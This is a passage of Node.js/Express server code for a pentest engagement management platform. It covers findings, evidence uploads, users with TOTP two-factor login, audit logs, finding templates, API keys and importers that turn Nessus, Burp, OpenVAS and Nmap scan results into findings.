  if (!value) return res.status(400).json({ error: "value es requerido" });
  const sid = uuidv4();
  await qRun("INSERT INTO scope_items (id,engagement_id,type,value,in_scope,notes) VALUES (?,?,?,?,?,?)",
    [sid, req.params.id, type||'domain', value, in_scope!==false?1:0, notes||null]);
  res.status(201).json(await qRow("SELECT * FROM scope_items WHERE id=?", [sid]));
});

app.delete("/api/engagements/:id/scope/:sid", auth(), async (req, res) => {
  await qRun("DELETE FROM scope_items WHERE id=? AND engagement_id=?", [req.params.sid, req.params.id]);
  res.json({ ok: true });
});

// ── OPERATION LOGS ────────────────────────────────────────────────────────────
app.get("/api/engagements/:id/phases/:phase/logs", auth(), async (req, res) => {
  const logs = await qRows(
    "SELECT * FROM operation_logs WHERE engagement_id=? AND phase_type=? ORDER BY logged_at DESC",
    [req.params.id, req.params.phase]
  );
  res.json(logs);
});

app.post("/api/engagements/:id/phases/:phase/logs", auth(), async (req, res) => {
  const { target, tool, command, notes } = req.body;
  if (!command && !notes) return res.status(400).json({ error: "command o notes requerido" });
  const lid = uuidv4();
  await qRun(
    "INSERT INTO operation_logs (id,engagement_id,phase_type,target,tool,command,notes,created_by) VALUES (?,?,?,?,?,?,?,?)",
    [lid, req.params.id, req.params.phase, target||null, tool||null, command||null, notes||null, req.user.id]
  );
  // Actualizar conteos en la fase
  await qRun(
    "UPDATE phases SET status='in_progress', started_at=COALESCE(started_at,NOW()) WHERE engagement_id=? AND phase_type=?",
    [req.params.id, req.params.phase]
  );
  res.status(201).json(await qRow("SELECT * FROM operation_logs WHERE id=?", [lid]));
});

app.delete("/api/engagements/:id/phases/:phase/logs/:lid", auth(), async (req, res) => {
  await qRun("DELETE FROM operation_logs WHERE id=? AND engagement_id=?", [req.params.lid, req.params.id]);
  res.json({ ok: true });
});

// ── FINDINGS ──────────────────────────────────────────────────────────────────
app.get("/api/engagements/:id/findings", auth(), async (req, res) => {
  const { phase } = req.query;
  let sql = "SELECT id,title,severity,status,cvss_score_31,affected_asset,phase_type,created_at FROM findings WHERE engagement_id=?";
  const params = [req.params.id];
  if (phase && phase !== 'all') { sql += " AND phase_type=?"; params.push(phase); }
  sql += " ORDER BY FIELD(severity,'critical','high','medium','low','info'), title";
  res.json(await qRows(sql, params));
});

app.get("/api/engagements/:id/findings/:fid", auth(), async (req, res) => {
  const f = await qRow("SELECT * FROM findings WHERE id=? AND engagement_id=?", [req.params.fid, req.params.id]);
  if (!f) return res.status(404).json({ error: "No encontrado" });
  f.evidences = await qRows("SELECT * FROM evidences WHERE finding_id=?", [req.params.fid]);
  res.json(f);
});

app.post("/api/engagements/:id/findings", auth(), async (req, res) => {
  const {
    title, description, steps_to_reproduce, affected_asset,
    cvss_vector_31, cvss_score_31, cvss_vector_40, cvss_score_40,
    severity, business_risk, exploitability,
    cwe_id, cwe_name, owasp_category, owasp_year,
    mitre_tactic, mitre_technique_id, mitre_technique_name,
    recommendation, executive_summary, references_list,
    phase_type, status,
  } = req.body;
  if (!title) return res.status(400).json({ error: "title es requerido" });
  const fid = uuidv4();
  await qRun(
    `INSERT INTO findings (id,engagement_id,phase_type,title,description,steps_to_reproduce,
      affected_asset,cvss_vector_31,cvss_score_31,cvss_vector_40,cvss_score_40,
      severity,business_risk,exploitability,cwe_id,cwe_name,owasp_category,owasp_year,
      mitre_tactic,mitre_technique_id,mitre_technique_name,
      recommendation,executive_summary,references_list,status,created_by)
     VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`,
    [fid, req.params.id, phase_type||null, title, description||null, steps_to_reproduce||null,
     affected_asset||null, cvss_vector_31||null, cvss_score_31||null, cvss_vector_40||null, cvss_score_40||null,
     severity||'medium', business_risk||'medium', exploitability||'theoretical',
     cwe_id||null, cwe_name||null, owasp_category||null, owasp_year||null,
     mitre_tactic||null, mitre_technique_id||null, mitre_technique_name||null,
     recommendation||null, executive_summary||null,
     references_list?JSON.stringify(references_list):null,
     status||'open', req.user.id]
  );
  res.status(201).json(await qRow("SELECT * FROM findings WHERE id=?", [fid]));
});

app.put("/api/engagements/:id/findings/:fid", auth(), async (req, res) => {
  const f = await qRow("SELECT id FROM findings WHERE id=? AND engagement_id=?", [req.params.fid, req.params.id]);
  if (!f) return res.status(404).json({ error: "No encontrado" });
  const {
    title, description, steps_to_reproduce, affected_asset,
    cvss_vector_31, cvss_score_31, cvss_vector_40, cvss_score_40,
    severity, business_risk, exploitability,
    cwe_id, cwe_name, owasp_category, owasp_year,
    mitre_tactic, mitre_technique_id, mitre_technique_name,
    recommendation, executive_summary, references_list,
    phase_type, status,
  } = req.body;
  await qRun(
    `UPDATE findings SET title=?,description=?,steps_to_reproduce=?,affected_asset=?,
      cvss_vector_31=?,cvss_score_31=?,cvss_vector_40=?,cvss_score_40=?,
      severity=?,business_risk=?,exploitability=?,cwe_id=?,cwe_name=?,
      owasp_category=?,owasp_year=?,mitre_tactic=?,mitre_technique_id=?,mitre_technique_name=?,
      recommendation=?,executive_summary=?,references_list=?,phase_type=?,status=?
     WHERE id=?`,
    [title, description||null, steps_to_reproduce||null, affected_asset||null,
     cvss_vector_31||null, cvss_score_31||null, cvss_vector_40||null, cvss_score_40||null,
     severity, business_risk, exploitability,
     cwe_id||null, cwe_name||null, owasp_category||null, owasp_year||null,
     mitre_tactic||null, mitre_technique_id||null, mitre_technique_name||null,
     recommendation||null, executive_summary||null,
     references_list?JSON.stringify(references_list):null,
     phase_type||null, status, req.params.fid]
  );
  res.json(await qRow("SELECT * FROM findings WHERE id=?", [req.params.fid]));
});

app.delete("/api/engagements/:id/findings/:fid", auth(["admin","auditor"]), async (req, res) => {
  await qRun("DELETE FROM findings WHERE id=? AND engagement_id=?", [req.params.fid, req.params.id]);
  res.json({ ok: true });
});

// ── EVIDENCIAS ───────────────────────────────────────────────────────────────
app.get("/api/engagements/:id/evidences", auth(), async (req, res) => {
  const { finding_id, phase } = req.query;
  let sql = "SELECT * FROM evidences WHERE engagement_id=?";
  const params = [req.params.id];
  if (finding_id) { sql += " AND finding_id=?"; params.push(finding_id); }
  if (phase)      { sql += " AND phase_type=?";  params.push(phase); }
  sql += " ORDER BY uploaded_at DESC";
  res.json(await qRows(sql, params));
});

// Allowed MIME types for evidence uploads
const EVIDENCE_ALLOWED_MIMES = new Set([
  "image/png","image/jpeg","image/gif","image/webp","image/svg+xml","image/bmp",
  "application/pdf",
  "text/plain","text/csv","text/html","text/xml","application/xml",
  "application/json",
  "application/zip","application/x-zip-compressed",
  "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
  "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
  "application/vnd.ms-excel","application/msword",
  "video/mp4","video/webm",
]);
const EVIDENCE_ALLOWED_EXTS = new Set([
  ".png",".jpg",".jpeg",".gif",".webp",".svg",".bmp",
  ".pdf",".txt",".csv",".html",".xml",".json",".zip",
  ".docx",".doc",".xlsx",".xls",
  ".mp4",".webm",
]);

app.post("/api/engagements/:id/evidences", auth(), upload.single("file"), async (req, res) => {
  if (!req.file) return res.status(400).json({ error: "No se recibió archivo" });
  // Validate file type to prevent executable/script uploads
  const ext = path.extname(req.file.originalname).toLowerCase();
  if (!EVIDENCE_ALLOWED_MIMES.has(req.file.mimetype) || !EVIDENCE_ALLOWED_EXTS.has(ext)) {
    try { fs.unlinkSync(req.file.path); } catch {}
    return res.status(400).json({ error: "Tipo de archivo no permitido" });
  }
  const eng = await qRow("SELECT id FROM engagements WHERE id=?", [req.params.id]);
  if (!eng) return res.status(404).json({ error: "Engagement no encontrado" });
  const { finding_id, phase_type, caption } = req.body;
  const eid = uuidv4();
  await qRun(
    "INSERT INTO evidences (id,engagement_id,finding_id,phase_type,filename,original_name,file_type,file_size,caption,uploaded_by) VALUES (?,?,?,?,?,?,?,?,?,?)",
    [eid, req.params.id, finding_id||null, phase_type||null, req.file.filename,
     req.file.originalname, req.file.mimetype, req.file.size, caption||null, req.user.id]
  );
  res.status(201).json(await qRow("SELECT * FROM evidences WHERE id=?", [eid]));
});

app.delete("/api/engagements/:id/evidences/:eid", auth(), async (req, res) => {
  const ev = await qRow("SELECT filename FROM evidences WHERE id=? AND engagement_id=?", [req.params.eid, req.params.id]);
  if (!ev) return res.status(404).json({ error: "No encontrado" });
  try { fs.unlinkSync(path.join(UPLOADS_DIR, ev.filename)); } catch {}
  await qRun("DELETE FROM evidences WHERE id=?", [req.params.eid]);
  res.json({ ok: true });
});

// Servir archivos de evidencia — acepta token via Authorization header O ?token= query param
// (necesario para <img src=> en browser, que no puede enviar headers custom)
app.get("/api/uploads/:filename", async (req, res) => {
  try {
    // Validate filename is a UUID (multer-generated) — prevents path traversal
    if (!/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/.test(req.params.filename)) {
      return res.status(400).json({ error: "Nombre de archivo inválido" });
    }
    const h = req.headers.authorization;
    const rawToken = h?.startsWith("Bearer ") ? h.slice(7) : req.query.token;
    if (!rawToken) return res.status(401).json({ error: "Sin token" });
    const decoded = jwt.verify(rawToken, JWT_SECRET);
    const user = await qRow(
      "SELECT id, token_version FROM users WHERE id=? AND is_active=1",
      [decoded.id]
    );
    if (!user || user.token_version !== decoded.tv) return res.status(401).json({ error: "Token inválido" });
    const filepath = path.join(UPLOADS_DIR, req.params.filename);
    if (!fs.existsSync(filepath)) return res.status(404).json({ error: "Archivo no encontrado" });
    res.sendFile(filepath);
  } catch {
    return res.status(401).json({ error: "Token inválido" });
  }
});

// ── USUARIOS ──────────────────────────────────────────────────────────────────
app.get("/api/usuarios", auth(["admin"]), async (req, res) => {
  res.json(await qRows("SELECT id,username,email,full_name,role,is_active,last_login,created_at FROM users ORDER BY full_name"));
});

app.post("/api/usuarios", auth(["admin"]), async (req, res) => {
  const { username, email, full_name, password, role } = req.body;
  if (!username || !email || !password) return res.status(400).json({ error: "Faltan campos" });
  const err = validatePassword(password);
  if (err) return res.status(400).json({ error: err });
  const hash = await bcrypt.hash(password, 12);
  const id = uuidv4();
  try {
    await qRun("INSERT INTO users (id,username,email,full_name,password_hash,role) VALUES (?,?,?,?,?,?)",
      [id, username, email, full_name||'', hash, role||'pentester']);
    auditLog(req.user.id, req.user.username, "create_user", "users", id, `usuario: ${username}`, req.ip);
    res.status(201).json(await qRow("SELECT id,username,email,full_name,role,is_active FROM users WHERE id=?", [id]));
  } catch (e) {
    if (e.code === 'ER_DUP_ENTRY') return res.status(409).json({ error: "Usuario o email ya existe" });
    throw e;
  }
});

app.put("/api/usuarios/:id", auth(["admin"]), async (req, res) => {
  const u = await qRow("SELECT id FROM users WHERE id=?", [req.params.id]);
  if (!u) return res.status(404).json({ error: "No encontrado" });
  const { full_name, email, role, password } = req.body;
  if (password) {
    const err = validatePassword(password);
    if (err) return res.status(400).json({ error: err });
    const hash = await bcrypt.hash(password, 12);
    await qRun("UPDATE users SET full_name=?,email=?,role=?,password_hash=?,token_version=token_version+1 WHERE id=?",
      [full_name, email, role, hash, req.params.id]);
  } else {
    await qRun("UPDATE users SET full_name=?,email=?,role=? WHERE id=?", [full_name, email, role, req.params.id]);
  }
  const updated = await qRow("SELECT id,username,email,full_name,role,is_active,totp_enabled FROM users WHERE id=?", [req.params.id]);
  auditLog(req.user.id, req.user.username, "update_user", "users", req.params.id, `Usuario ${updated.username} actualizado`, req.ip);
  res.json(updated);
});

app.delete("/api/usuarios/:id", auth(["admin"]), async (req, res) => {
  if (req.params.id === req.user.id) return res.status(400).json({ error: "No podés eliminarte a vos mismo" });
  const u = await qRow("SELECT id FROM users WHERE id=?", [req.params.id]);
  if (!u) return res.status(404).json({ error: "No encontrado" });
  const del = await qRow("SELECT username FROM users WHERE id=?", [req.params.id]);
  await qRun("DELETE FROM users WHERE id=?", [req.params.id]);
  auditLog(req.user.id, req.user.username, "delete_user", "users", req.params.id, `usuario: ${del?.username}`, req.ip);
  res.json({ ok: true });
});

app.delete("/api/usuarios/:id/totp", auth(["admin"]), async (req, res) => {
  const target = await qRow("SELECT username FROM users WHERE id=?", [req.params.id]);
  await qRun("UPDATE users SET totp_secret=NULL, totp_enabled=0 WHERE id=?", [req.params.id]);
  auditLog(req.user.id, req.user.username, "reset_totp", "users", req.params.id, `2FA reseteado para ${target?.username}`, req.ip);
  res.json({ ok: true });
});

app.put("/api/usuarios/:id/toggle", auth(["admin"]), async (req, res) => {
  const u = await qRow("SELECT id,is_active FROM users WHERE id=?", [req.params.id]);
  if (!u) return res.status(404).json({ error: "No encontrado" });
  if (req.params.id === req.user.id) return res.status(400).json({ error: "No podés desactivarte a vos mismo" });
  const newActive = u.is_active ? 0 : 1;
  await qRun("UPDATE users SET is_active=?, token_version=token_version+1 WHERE id=?", [newActive, req.params.id]);
  const toggled = await qRow("SELECT username FROM users WHERE id=?", [req.params.id]);
  auditLog(req.user.id, req.user.username, "toggle_user", "users", req.params.id,
    `Usuario ${toggled?.username} ${newActive ? 'habilitado' : 'bloqueado'}`, req.ip);
  res.json({ ok: true });
});

// ── TOTP personal (perfil) ────────────────────────────────────────────────────
app.post("/api/auth/totp/setup", auth(), async (req, res) => {
  const user = await qRow("SELECT id,username,email,totp_enabled FROM users WHERE id=?", [req.user.id]);
  if (user.totp_enabled) return res.status(400).json({ error: "2FA ya está activo" });
  const secret = generateTotpSecret();
  // Guardar secreto provisionalmente (no habilitar aún — se habilita tras verificar)
  await qRun("UPDATE users SET totp_secret=? WHERE id=?", [secret, req.user.id]);
  const issuer = "Gungnir";
  const label = encodeURIComponent(`${issuer}:${user.username}`);
  const uri = `otpauth://totp/${label}?secret=${secret}&issuer=${encodeURIComponent(issuer)}&algorithm=SHA1&digits=6&period=30`;
  res.json({ secret, uri });
});

app.post("/api/auth/totp/verify", auth(), async (req, res) => {
  const { code } = req.body;
  const user = await qRow("SELECT id,totp_secret,totp_enabled FROM users WHERE id=?", [req.user.id]);
  if (!user.totp_secret) return res.status(400).json({ error: "Primero iniciá el setup de 2FA" });
  if (!verifyTotp(user.totp_secret, String(code))) return res.status(400).json({ error: "Código incorrecto" });
  await qRun("UPDATE users SET totp_enabled=1 WHERE id=?", [req.user.id]);
  auditLog(req.user.id, req.user.username, "totp_enabled", "users", req.user.id, "2FA activado", req.ip);
  res.json({ ok: true });
});

app.delete("/api/auth/totp", auth(), async (req, res) => {
  const { password } = req.body;
  const user = await qRow("SELECT * FROM users WHERE id=?", [req.user.id]);
  if (password && !await bcrypt.compare(password, user.password_hash)) {
    return res.status(400).json({ error: "Contraseña incorrecta" });
  }
  await qRun("UPDATE users SET totp_secret=NULL, totp_enabled=0, token_version=token_version+1 WHERE id=?", [req.user.id]);
  auditLog(req.user.id, req.user.username, "totp_disabled", "users", req.user.id, "2FA desactivado", req.ip);
  res.json({ ok: true });
});

// ── PERFIL ────────────────────────────────────────────────────────────────────
app.get("/api/perfil", auth(), async (req, res) => {
  const user = await qRow(
    "SELECT id,username,email,full_name,role,totp_enabled,last_login,created_at FROM users WHERE id=?",
    [req.user.id]
  );
  res.json(user);
});

app.put("/api/perfil", auth(), async (req, res) => {
  const { full_name, email } = req.body;
  await qRun("UPDATE users SET full_name=?, email=? WHERE id=?", [full_name, email, req.user.id]);
  res.json(await qRow("SELECT id,username,email,full_name,role FROM users WHERE id=?", [req.user.id]));
});

// ── AUDITORÍA ─────────────────────────────────────────────────────────────────
app.get("/api/auditoria", auth(["admin","auditor"]), async (req, res) => {
  const limit  = Math.min(parseInt(req.query.limit) || 100, 500);
  const offset = parseInt(req.query.offset) || 0;
  const rows = await qRows(
    "SELECT id,user_id,username,action,entity,entity_id,detail,ip,created_at FROM audit_logs ORDER BY created_at DESC LIMIT ? OFFSET ?",
    [limit, offset]
  );
  const total = await qRow("SELECT COUNT(*) AS c FROM audit_logs");
  res.json({ rows, total: total.c });
});

// ── SETTINGS ─────────────────────────────────────────────────────────────────
app.get("/api/settings", auth(), async (req, res) => {
  const rows = await qRows("SELECT `key`, `value` FROM settings");
  const obj = {};
  for (const r of rows) obj[r.key] = r.value;
  res.json(obj);
});

app.put("/api/settings", auth(["admin"]), async (req, res) => {
  const allowed = ["report_org_name","report_org_email","report_org_website","report_disclaimer"];
  for (const [k, v] of Object.entries(req.body)) {
    if (!allowed.includes(k)) continue;
    await qRun("INSERT INTO settings (`key`,`value`) VALUES (?,?) ON DUPLICATE KEY UPDATE `value`=?", [k, v, v]);
  }
  auditLog(req.user.id, req.user.username, "update_settings", "settings", null, null, req.ip);
  const rows2 = await qRows("SELECT `key`, `value` FROM settings");
  const obj = {};
  for (const r of rows2) obj[r.key] = r.value;
  res.json(obj);
});

// ── FINDING TEMPLATES ─────────────────────────────────────────────────────────
app.get("/api/templates/findings", auth(), async (req, res) => {
  const { q, category, severity } = req.query;
  let sql = "SELECT id,title,category,severity,cwe_id,cwe_name,owasp_category,cvss_vector_31,cvss_score_31,is_builtin,created_by,created_at FROM finding_templates WHERE 1=1";
  const params = [];
  if (q) { sql += " AND (title LIKE ? OR category LIKE ? OR cwe_name LIKE ?)"; const p = `%${q}%`; params.push(p,p,p); }
  if (category) { sql += " AND category=?"; params.push(category); }
  if (severity)  { sql += " AND severity=?";  params.push(severity); }
  sql += " ORDER BY is_builtin DESC, title";
  res.json(await qRows(sql, params));
});

app.get("/api/templates/findings/:id", auth(), async (req, res) => {
  const t = await qRow("SELECT * FROM finding_templates WHERE id=?", [req.params.id]);
  if (!t) return res.status(404).json({ error: "No encontrado" });
  res.json(t);
});

app.post("/api/templates/findings", auth(["admin","auditor","pentester"]), async (req, res) => {
  const { title, category, severity, description, steps_to_reproduce, recommendation,
          cwe_id, cwe_name, owasp_category, cvss_vector_31, cvss_score_31, references_list } = req.body;
  if (!title) return res.status(400).json({ error: "title es requerido" });
  const id = uuidv4();
  await qRun(
    `INSERT INTO finding_templates (id,title,category,severity,description,steps_to_reproduce,recommendation,cwe_id,cwe_name,owasp_category,cvss_vector_31,cvss_score_31,references_list,is_builtin,created_by)
     VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,0,?)`,
    [id, title, category||null, severity||'medium', description||null, steps_to_reproduce||null, recommendation||null,
     cwe_id||null, cwe_name||null, owasp_category||null, cvss_vector_31||null, cvss_score_31||null,
     references_list?JSON.stringify(references_list):null, req.user.id]
  );
  res.status(201).json(await qRow("SELECT * FROM finding_templates WHERE id=?", [id]));
});

app.put("/api/templates/findings/:id", auth(["admin","auditor","pentester"]), async (req, res) => {
  const t = await qRow("SELECT id,is_builtin,created_by FROM finding_templates WHERE id=?", [req.params.id]);
  if (!t) return res.status(404).json({ error: "No encontrado" });
  if (t.is_builtin && req.user.role !== 'admin') return res.status(403).json({ error: "No podés editar templates built-in" });
  const { title, category, severity, description, steps_to_reproduce, recommendation,
          cwe_id, cwe_name, owasp_category, cvss_vector_31, cvss_score_31, references_list } = req.body;
  await qRun(
    `UPDATE finding_templates SET title=?,category=?,severity=?,description=?,steps_to_reproduce=?,recommendation=?,
     cwe_id=?,cwe_name=?,owasp_category=?,cvss_vector_31=?,cvss_score_31=?,references_list=? WHERE id=?`,
    [title, category||null, severity||'medium', description||null, steps_to_reproduce||null, recommendation||null,
     cwe_id||null, cwe_name||null, owasp_category||null, cvss_vector_31||null, cvss_score_31||null,
     references_list?JSON.stringify(references_list):null, req.params.id]
  );
  res.json(await qRow("SELECT * FROM finding_templates WHERE id=?", [req.params.id]));
});

app.delete("/api/templates/findings/:id", auth(["admin","auditor"]), async (req, res) => {
  const t = await qRow("SELECT id,is_builtin FROM finding_templates WHERE id=?", [req.params.id]);
  if (!t) return res.status(404).json({ error: "No encontrado" });
  if (t.is_builtin && req.user.role !== 'admin') return res.status(403).json({ error: "No podés eliminar templates built-in" });
  await qRun("DELETE FROM finding_templates WHERE id=?", [req.params.id]);
  res.json({ ok: true });
});

// ── SCANNER IMPORT ────────────────────────────────────────────────────────────
const scannerUpload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 50 * 1024 * 1024 } });

function xmlGetTag(xml, tag) {
  const re = new RegExp(`<${tag}(?:\\s[^>]*)?>([\\s\\S]*?)<\\/${tag}>`, 'i');
  const m = re.exec(xml); return m ? m[1].replace(/<!\[CDATA\[|\]\]>/g, '').replace(/<[^>]+>/g, ' ').replace(/\s+/g,' ').trim() : '';
}
function xmlGetAttr(xml, tag, attr) {
  const re = new RegExp(`<${tag}[^>]*\\s${attr}="([^"]*)"`, 'i');
  const m = re.exec(xml); return m ? m[1] : '';
}
function nessusToSeverity(s) { return {4:'critical',3:'high',2:'medium',1:'low',0:'info'}[s]||'medium'; }
function burpToSeverity(s) {
  const m = {high:'high',medium:'medium',low:'low',information:'info',informational:'info',critical:'critical'};
  return m[(s||'').toLowerCase()]||'medium';
}
function openvasToSeverity(score) {
  const n = parseFloat(score)||0;
  if (n>=9) return 'critical'; if(n>=7) return 'high'; if(n>=4) return 'medium'; if(n>0) return 'low'; return 'info';
}

function parseNessus(xml) {
  const findings = [];
  const re = /<ReportItem\s([^>]*)>([\s\S]*?)<\/ReportItem>/gi;
  let m;
  while ((m = re.exec(xml)) !== null) {
    const attrs = m[1]; const body = m[2];
    const pluginName = xmlGetAttr(`<x ${attrs}/>`, 'x', 'pluginName')||xmlGetTag(body,'pluginName');
    const port       = xmlGetAttr(`<x ${attrs}/>`, 'x', 'port');
    const protocol   = xmlGetAttr(`<x ${attrs}/>`, 'x', 'protocol');
    const severityN  = xmlGetAttr(`<x ${attrs}/>`, 'x', 'severity');
    const svcName    = xmlGetAttr(`<x ${attrs}/>`, 'x', 'svc_name');
    const host       = (() => { const hm = /<ReportHost name="([^"]*)"/.exec(xml.substring(0,m.index+m[0].length)); return hm?hm[1]:''; })();
    if (!pluginName || pluginName==='Nessus SYN scanner' || pluginName==='Nessus TCP scanner') continue;
    findings.push({
      title: pluginName,
      severity: nessusToSeverity(parseInt(severityN)||0),
      affected_asset: [host,svcName,port,protocol].filter(Boolean).join(' '),
      description: xmlGetTag(body,'description'),
      steps_to_reproduce: xmlGetTag(body,'plugin_output'),
      recommendation: xmlGetTag(body,'solution'),
      cvss_vector_31: xmlGetTag(body,'cvss3_vector'),
      cvss_score_31: parseFloat(xmlGetTag(body,'cvss3_base_score'))||null,
      cwe_id: xmlGetTag(body,'cwe'),
      owasp_category: '',
    });
  }
  return findings;
}

function parseBurp(xml) {
  const findings = [];
  const re = /<issue>([\s\S]*?)<\/issue>/gi;
  let m;
  while ((m = re.exec(xml)) !== null) {
    const body = m[1];
    const host = xmlGetTag(body,'host');
    const path = xmlGetTag(body,'path');
    findings.push({
      title: xmlGetTag(body,'name'),
      severity: burpToSeverity(xmlGetTag(body,'severity')),
      affected_asset: host + (path||''),
      description: xmlGetTag(body,'issueBackground') || xmlGetTag(body,'issueDetail'),
      steps_to_reproduce: '',
      recommendation: xmlGetTag(body,'remediationBackground') || xmlGetTag(body,'remediationDetail'),
      cvss_vector_31: null,
      cvss_score_31: null,
      cwe_id: '',
      owasp_category: '',
    });
  }
  return findings;
}

function parseOpenVAS(xml) {
  const findings = [];
  const re = /<result\s[^>]*>([\s\S]*?)<\/result>/gi;
  let m;
  while ((m = re.exec(xml)) !== null) {
    const body = m[1];
    const score = xmlGetTag(body,'severity') || xmlGetTag(body,'cvss_base');
    if (parseFloat(score) === 0) continue; // skip informational
    findings.push({
      title: xmlGetTag(body,'name') || xmlGetTag(xmlGetTag(body,'nvt'),'name'),
      severity: openvasToSeverity(score),
      affected_asset: [xmlGetTag(body,'host'),xmlGetTag(body,'port')].filter(Boolean).join(':'),
      description: xmlGetTag(body,'description'),
      steps_to_reproduce: '',
      recommendation: xmlGetTag(body,'solution') || xmlGetTag(body,'tags'),
      cvss_vector_31: null,
      cvss_score_31: parseFloat(score)||null,
      cwe_id: '',
      owasp_category: '',
    });
  }
  return findings;
}

function parseNmap(xml) {
  const findings = [];
  // Ports that warrant elevated severity
  const RISKY_PORTS = {
    21: 'low', 23: 'high', 25: 'low', 53: 'low',
    111: 'low', 135: 'medium', 137: 'low', 139: 'medium',
    445: 'medium', 512: 'high', 513: 'high', 514: 'high',
    1433: 'medium', 1521: 'medium', 3306: 'medium',
    3389: 'medium', 5900: 'medium', 6379: 'medium',
    27017: 'medium', 5432: 'medium',
  };
  const hostRe = /<host[\s>]([\s\S]*?)<\/host>/gi;
  let hm;
  while ((hm = hostRe.exec(xml)) !== null) {
    const hostBody = hm[1];
    // Extract IP/hostname
    const addrMatch = /address[^>]*addr="([^"]+)"[^>]*addrtype="ipv4"/.exec(hostBody)
      || /address[^>]*addrtype="ipv4"[^>]*addr="([^"]+)"/.exec(hostBody);
    const ip = addrMatch ? addrMatch[1] : '';
    const hostnameMatch = /<hostname[^>]*name="([^"]+)"/.exec(hostBody);
    const hostname = hostnameMatch ? hostnameMatch[1] : '';
    const host = hostname || ip;
    // Check host is up
    const stateMatch = /<status[^>]*state="([^"]+)"/.exec(hostBody);
    if (stateMatch && stateMatch[1] !== 'up') continue;
    // Parse open ports
    const portRe = /<port\s+protocol="([^"]+)"\s+portid="([^"]+)">([\s\S]*?)<\/port>/gi;
    let pm;
    while ((pm = portRe.exec(hostBody)) !== null) {
      const proto = pm[1]; const portId = parseInt(pm[2]); const portBody = pm[3];
      // Only open ports
      const portState = /<state\s+state="([^"]+)"/.exec(portBody);
      if (!portState || portState[1] !== 'open') continue;
      // Service info
      const svcMatch = /<service([^>]*)>/.exec(portBody);
      const svcName    = svcMatch ? (xmlGetAttr(svcMatch[0],'service','name')||'') : '';
      const svcProduct = svcMatch ? (xmlGetAttr(svcMatch[0],'service','product')||'') : '';
      const svcVersion = svcMatch ? (xmlGetAttr(svcMatch[0],'service','version')||'') : '';
      const extraInfo  = svcMatch ? (xmlGetAttr(svcMatch[0],'service','extrainfo')||'') : '';
      const svcLabel = [svcName.toUpperCase(), svcProduct, svcVersion].filter(Boolean).join(' ');
      const title = `Open Port ${portId}/${proto}${svcLabel ? ' — ' + svcLabel : ''}`;
      const descParts = [];
      if (svcProduct || svcVersion) descParts.push(`Service: ${[svcProduct,svcVersion].filter(Boolean).join(' ')}`);
      if (extraInfo) descParts.push(`Details: ${extraInfo}`);
      if (hostname && ip && hostname !== ip) descParts.push(`Host: ${hostname} (${ip})`);
      else if (host) descParts.push(`Host: ${host}`);
      const severity = RISKY_PORTS[portId] || 'info';
      findings.push({
        title,
        severity,
        affected_asset: `${host}:${portId}/${proto}`,
        description: descParts.join('\n'),
        steps_to_reproduce: `nmap -sV -p ${portId} ${ip || host}`,
        recommendation: 'Verify that this service is intentionally exposed. Ensure firewall rules restrict access to authorized sources only. Review the service version for known vulnerabilities.',
        cvss_vector_31: null,
        cvss_score_31: null,
        cwe_id: '',
        owasp_category: '',
      });
    }
  }
  return findings;
}

app.post("/api/engagements/:id/import-scan", auth(["admin","auditor","pentester"]), scannerUpload.single("file"), async (req, res) => {
  const eng = await qRow("SELECT id FROM engagements WHERE id=?", [req.params.id]);
  if (!eng) return res.status(404).json({ error: "Engagement no encontrado" });
  if (!req.file) return res.status(400).json({ error: "Archivo requerido" });

  const { scanner_type, phase_type } = req.body;
  const xml = req.file.buffer.toString('utf8');
  let findings = [];

  try {
    if (scanner_type === 'nessus')       findings = parseNessus(xml);
    else if (scanner_type === 'burp')    findings = parseBurp(xml);
    else if (scanner_type === 'openvas') findings = parseOpenVAS(xml);
    else if (scanner_type === 'nmap')    findings = parseNmap(xml);
    else return res.status(400).json({ error: "scanner_type debe ser nessus, burp, openvas o nmap" });
  } catch(e) {
    return res.status(400).json({ error: "Error al parsear el archivo: " + e.message });
  }

  if (!findings.length) return res.status(400).json({ error: "No se encontraron hallazgos en el archivo" });

  const created = [];
  for (const f of findings) {
    if (!f.title) continue;
    const fid = uuidv4();
    await qRun(
      `INSERT INTO findings (id,engagement_id,phase_type,title,description,steps_to_reproduce,affected_asset,cvss_vector_31,cvss_score_31,severity,cwe_id,owasp_category,recommendation,status,created_by)
       VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`,
      [fid, req.params.id, phase_type||'scanning', f.title, f.description||null, f.steps_to_reproduce||null,
       f.affected_asset||null, f.cvss_vector_31||null, f.cvss_score_31||null,
       f.severity||'medium', f.cwe_id||null, f.owasp_category||null, f.recommendation||null,
       'open', req.user.id]
    );
    created.push({ id: fid, title: f.title, severity: f.severity });
  }

  auditLog(req.user.id, req.user.username, "import_scan", "findings", req.params.id,
    `Import ${scanner_type}: ${created.length} hallazgos importados`, req.ip);
  res.json({ imported: created.length, findings: created });
});

// ── API KEYS ──────────────────────────────────────────────────────────────────
const crypto = require("crypto");

app.get("/api/api-keys", auth(), async (req, res) => {
  const keys = await qRows(
    "SELECT id,name,key_prefix,permissions,last_used,expires_at,is_active,created_at FROM api_keys WHERE user_id=? ORDER BY created_at DESC",
    [req.user.id]
  );
  res.json(keys);
});

app.post("/api/api-keys", auth(), async (req, res) => {
  const { name, expires_in_days, permissions } = req.body;
  if (!name) return res.status(400).json({ error: "name es requerido" });

  const rawKey = "gngr_" + crypto.randomBytes(32).toString("hex");
  const hash   = await bcrypt.hash(rawKey, 10);
  const prefix = rawKey.slice(0, 12);
  const id     = uuidv4();

  let expires_at = null;
  if (expires_in_days && parseInt(expires_in_days) > 0) {
    expires_at = new Date(Date.now() + parseInt(expires_in_days) * 86400000)
      .toISOString().slice(0,19).replace("T"," ");
  }

  await qRun(
    "INSERT INTO api_keys (id,name,key_hash,key_prefix,user_id,permissions,expires_at) VALUES (?,?,?,?,?,?,?)",
    [id, name, hash, prefix, req.user.id, permissions?JSON.stringify(permissions):null, expires_at]
  );
  // Only returned once
  res.status(201).json({ id, name, key_prefix: prefix, raw_key: rawKey, expires_at, created_at: new Date().toISOString() });
});

